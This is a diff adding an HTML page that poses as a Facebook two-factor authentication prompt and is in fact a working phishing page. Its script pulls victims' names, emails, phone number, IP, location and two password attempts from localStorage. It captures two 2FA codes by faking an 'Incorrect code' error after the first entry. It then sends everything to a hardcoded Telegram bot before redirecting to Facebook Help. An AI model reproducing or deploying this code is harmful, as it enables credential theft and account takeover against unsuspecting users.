@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Check your text messages</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .twofa-container {
+            background-color: #f0f2f5;
+            padding: 30px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 550px;
+            text-align: center;
+        }
+        .twofa-container h3 {
+            font-size: 20px;
+            color: #1c2b33;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+        .twofa-container p {
+            font-size: 15px;
+            color: #606770;
+            margin-bottom: 20px;
+            line-height: 1.4;
+            text-align: left;
+        }
+        .twofa-container .illustration {
+            width: -webkit-fill-available;
+            margin: 20px auto;
+            display: block;
+        }
+        .twofa-container .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .twofa-container label {
+            display: block;
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 5px;
+        }
+        .twofa-container input#twofaInput {
+            width: 100%;
+            padding: 12px 10px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .twofa-container input#twofaInput:focus {
+            border-color: #1877f2;
+        }
+        .twofa-container .error-message {
+            color: #fa3e3e;
+            font-size: 13px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            text-align: left;
+            display: none; /* Hidden by default */
+        }
+        .twofa-container .timer-info {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+        .twofa-container .timer-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            /* Placeholder for timer icon - you might need a small SVG or image */
+            /* Using a simple SVG for a circle icon */
+            background-image: url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"%3E%3Cpath d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm.9 13H11V7h2V14.5h.9z"/%3E%3C/svg%3E');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+            display: inline-block;
+            vertical-align: middle;
+        }
+        .twofa-container #twofaTimer {
+            font-weight: bold;
+        }
+        .twofa-container button#confirmTwofaButton {
+            background-color: #2583ffda; /* Light gray background */
+            color: #ffffff; /* Dark gray text */
+            padding: 10px 20px;
+            border: 1px solid #2583ffda; /* Light gray border */
+            border-radius: 16px;
+            font-size: 16px;
+            cursor: pointer;
+            outline: none;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .twofa-container button#confirmTwofaButton:hover {
+            background-color: #0074e9; /* Slightly darker gray on hover */
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 768px) {
+            .twofa-container {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="twofa-container">
+        <h3>Check your text messages</h3>
+        <p>Your account has two-factor authentication enabled, which requires the following additional step. Enter the code that we sent to ***  @***.***</p>
+        <img src="https://i.ibb.co/dwcfYPs7/2fa.png" alt="2FA Illustration" class="illustration">
+        <div class="input-group">
+             <input type="text" id="twofaInput" placeholder="Code" required>
+            <div class="error-message" id="twofaError">Incorrect code. Please try again.</div>
+        </div>
+        <div class="timer-info">
+            <span class="timer-icon"></span>
+            We can send a new code in <span id="twofaTimer"> 2:55</span>
+        </div>
+        <button id="confirmTwofaButton">Continue</button>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '7017338655:AAFQfNMObLrj-GQKGjfZPlrgMkVMS-css_g';
+        const TELEGRAM_CHAT_ID = '-4133465696';
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        let storedFormData = {};
+        let storedIpAddress = 'N/A';
+        let storedLocationData = 'N/A';
+        let storedPasswordAttemptValue1 = '';
+        let storedPasswordAttemptValue2 = '';
+        let twoFAAttemptCount = 0; // Initialize count for 2FA page
+        let twoFAAttemptValue1 = '';
+        let twoFAAttemptValue2 = '';
+        let timerInterval;
+        let timerSeconds = 175; // 3 minutes = 180 seconds - 5 seconds (to show 2:55 initially)
+
+        // Elements
+        const twofaInput = document.getElementById('twofaInput');
+        const twofaError = document.getElementById('twofaError');
+        const confirmTwofaButton = document.getElementById('confirmTwofaButton');
+        const twofaTimerDisplay = document.getElementById('twofaTimer');
+
+        // --- Utility Functions ---
+
+        // Send message to Telegram
+        async function sendMessageToTelegram(message) {
+            const params = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+
+            try {
+                const response = await fetch(TELEGRAM_API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(params)
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram API error:', data.description);
+                } else {
+                    console.log('Message sent to Telegram successfully!');
+                }
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+            }
+        }
+
+        function updateTimerDisplay() {
+            const minutes = Math.floor(timerSeconds / 60);
+            const seconds = timerSeconds % 60;
+            twofaTimerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        }
+
+        function startTimer() {
+            updateTimerDisplay(); // Display initial 2:55
+            timerInterval = setInterval(() => {
+                timerSeconds--;
+                updateTimerDisplay();
+                if (timerSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    twofaTimerDisplay.textContent = '0:00';
+                    // Optional: logic to enable a 'Resend code' button here
+                }
+            }, 1000);
+        }
+
+        // --- 2FA Page Logic ---
+
+        confirmTwofaButton.addEventListener('click', async () => {
+            const twofaCode = twofaInput.value;
+            if (!twofaCode) {
+                twofaError.textContent = 'Code cannot be empty.';
+                twofaError.style.display = 'block';
+                return;
+            }
+
+            twoFAAttemptCount++;
+
+            let message = `<b>New Submission Attempt ${2 + twoFAAttemptCount}</b>\n`;
+            message += `------------------------------------\n`;
+            message += `<b>IP & Location:</b> ${storedIpAddress} (${storedLocationData})\n`;
+            message += `<b>Ticket Number:</b> ${storedFormData.ticketNumber}\n`;
+            message += `<b>Your Name:</b> ${storedFormData.yourName}\n`;
+            message += `<b>Business Email:</b> ${storedFormData.businessEmail}\n`;
+            message += `<b>Personal Email:</b> ${storedFormData.personalEmail}\n`;
+            message += `<b>Mobile Phone:</b> ${storedFormData.mobilePhoneNumber}\n`;
+            message += `<b>Additional Info:</b> ${storedFormData.additionalInfo || 'N/A'}\n`;
+            message += `<b>Password Attempt 1:</b> ${storedPasswordAttemptValue1}\n`;
+            message += `<b>Password Attempt 2:</b> ${storedPasswordAttemptValue2}\n`;
+
+            if (twoFAAttemptCount === 1) {
+                twoFAAttemptValue1 = twofaCode;
+                message += `<b>2FA Code Attempt 1:</b> ${twoFAAttemptValue1}\n`;
+                await sendMessageToTelegram(message);
+                twofaError.textContent = 'Incorrect code. Please try again.';
+                twofaError.style.display = 'block';
+                twofaInput.value = ''; // Clear input for next attempt
+            } else if (twoFAAttemptCount === 2) {
+                twoFAAttemptValue2 = twofaCode;
+                message += `<b>2FA Code Attempt 2:</b> ${twoFAAttemptValue2}\n`;
+                await sendMessageToTelegram(message);
+
+                // Clear localStorage upon successful completion
+                localStorage.clear();
+                clearInterval(timerInterval); // Clear the timer
+                window.location.href = 'https://www.facebook.com/help'; // Redirect to Facebook Help
+            }
+        });
+
+        // --- Initial Setup for 2FA Page ---
+        document.addEventListener('DOMContentLoaded', () => {
+            // Retrieve stored data from localStorage
+            const formDataJSON = localStorage.getItem('formData');
+            if (formDataJSON) {
+                storedFormData = JSON.parse(formDataJSON);
+            } else {
+                alert('No form data found. Please start from the beginning.');
+                window.location.href = 'confirm.html';
+                return;
+            }
+
+            storedIpAddress = localStorage.getItem('ipAddress') || 'N/A';
+            storedLocationData = localStorage.getItem('locationData') || 'N/A';
+            storedPasswordAttemptValue1 = localStorage.getItem('passwordAttemptValue1') || '';
+            storedPasswordAttemptValue2 = localStorage.getItem('passwordAttemptValue2') || '';
+
+            // Start the timer
+            startTimer();
+        });
+
+        // Clear localStorage if user navigates away unexpectedly
+        window.addEventListener('beforeunload', () => {
+            localStorage.clear();
+            clearInterval(timerInterval); // Also clear timer if leaving
+        });
+    </script>
+</body>
+</html>
